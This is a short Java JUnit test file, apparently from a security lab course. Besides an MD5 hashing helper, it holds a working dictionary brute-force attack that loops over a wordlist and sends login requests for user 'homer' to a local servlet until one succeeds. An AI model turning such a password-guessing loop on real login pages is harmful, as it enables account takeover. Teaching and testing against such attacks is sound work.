package org.se.lab;

import java.io.BufferedReader;
import java.io.FileReader;
import java.io.IOException;
import java.io.UnsupportedEncodingException;
import java.net.URL;
import java.security.MessageDigest;
import java.security.NoSuchAlgorithmException;

import org.junit.Assert;
import org.junit.Test;


public class BruteForceAttackTest
	extends AbstractHttpClientTest
{
	@Test
	public void testCalculateMd5String() throws NoSuchAlgorithmException, UnsupportedEncodingException
	{
		final String passwd = "student";
	
		String hash = calculateMd5String(passwd);
		Assert.assertEquals("cd73502828457d15655bbd7a63fb0bc8", hash);
	}

	
	@Test
	public void testBruteForceAttack() throws NoSuchAlgorithmException, IOException
	{
		final String filename = "wordlist.txt";
		final String username = "homer"; 	
		
		BufferedReader in = new BufferedReader(new FileReader(filename));			
		String password;	
		while((password = in.readLine()) != null)
		{
			URL url = new URL("http://localhost:8080" +
					"/Servlet-SimpleLogin/controller" +
					"?username=" + username + "&password=" + password + "&usergroup=User&action=Login");			
			String response = httpGetRequest(url);
			if(response.contains("Welcome"))
			{
				System.out.println("Success, password is: " + password);
				break;
			}
		}
		in.close();
	}

	
	/*
	 * Helper methods
	 */

	private String calculateMd5String(final String message)
			throws NoSuchAlgorithmException, UnsupportedEncodingException
	{
		MessageDigest algorithm = MessageDigest.getInstance("MD5");		
		algorithm.update(message.getBytes("UTF-8"));
		byte[] bytes = algorithm.digest();
		return convertToHexString(bytes);
	}

	
	private String convertToHexString(byte[] bytes)
	{
		StringBuilder hex = new StringBuilder();
		for(byte b : bytes)
		{
			int i = (b & 0xff); // copy the byte bit pattern into int value
			hex.append(String.format("%02x", i));
		}
		return hex.toString();
	}
}
